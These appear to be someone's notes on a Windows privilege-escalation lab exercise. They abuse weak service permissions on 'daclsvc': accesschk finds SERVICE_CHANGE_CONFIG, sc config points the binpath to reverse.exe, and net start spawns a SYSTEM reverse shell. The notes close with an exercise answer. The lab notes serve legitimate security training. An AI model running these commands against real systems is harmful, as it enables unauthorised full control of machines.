Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

![[Pasted image 20240527221813.png]]

Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):

```
sc qc daclsvc
```

![[Pasted image 20240527222106.png]]

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

![[Pasted image 20240527222316.png]]

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start daclsvc
```

![[Pasted image 20240527222418.png]]

Answer the questions below

| Question                                                      | Answer                                        |
| ------------------------------------------------------------- | --------------------------------------------- |
| What is the original BINARY_PATH_NAME of the daclsvc service? | C:\Program Files\DACL Service\daclservice.exe |
